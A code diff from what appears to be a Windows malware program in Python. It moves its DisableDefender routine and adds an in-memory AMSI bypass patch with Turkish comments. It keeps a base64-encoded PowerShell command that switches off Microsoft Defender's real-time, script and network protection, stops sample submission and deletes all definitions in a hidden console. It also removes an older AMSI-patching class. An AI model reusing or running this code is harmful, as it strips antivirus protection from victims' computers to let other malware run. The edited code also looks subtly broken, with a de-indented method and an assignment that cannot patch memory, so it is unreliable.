@@ -234,9 +234,15 @@ class Utility:
         return ctypes.windll.shell32.ShellExecuteW(None, 'runas', path, ' '.join(sys.argv), None, 1) == 42
 
     @staticmethod
-    def DisableDefender() -> None:
-        command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors='ignore')
-        subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+def DisableDefender() -> None:
+    # Önce AMSI'yi bypass et
+    try:
+        ctypes.windll.amsi.AmsiScanBuffer = ctypes.cast(ctypes.create_string_buffer(b'\xb8\x57\x00\x07\x80\xc3'), ctypes.c_void_p).value
+    except:
+        pass
+    # Orijinal komut (base64'lü)
+    command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors='ignore')
+    subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
 
     @staticmethod
     def ExcludeFromDefender(path: str=None) -> None:
@@ -1390,21 +1396,6 @@ if os.name == 'nt':
     if not Syscalls.CreateMutex(Settings.Mutex):
         Logger.info('Mutex already exists, exiting')
         os._exit(0)
-try:
-    import ctypes
-    class AMSI(object):
-        def __init__(self):
-            self.amsi = ctypes.windll.amsi
-            self.kernel32 = ctypes.windll.kernel32
-            self.amsi.AmsiInitialize(ctypes.c_wchar_p('AMSI'), ctypes.byref(ctypes.c_void_p()))
-            self.AmsiScanBuffer = self.amsi.AmsiScanBuffer
-            self.AmsiScanBuffer.restype = ctypes.c_uint
-            self.AmsiScanBuffer.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_uint, ctypes.c_void_p, ctypes.c_void_p]
-            patch = b'\xb8\x57\x00\x07\x80\xc3'
-            ctypes.windll.kernel32.VirtualProtect(self.AmsiScanBuffer, len(patch), 0x40, ctypes.byref(ctypes.c_uint()))
-            ctypes.memmove(self.AmsiScanBuffer, patch, len(patch))
-except:
-    pass
     if Utility.GetSelf()[1]:
         Logger.info('Trying to exclude the file from Windows defender')
         Utility.ExcludeFromDefender()
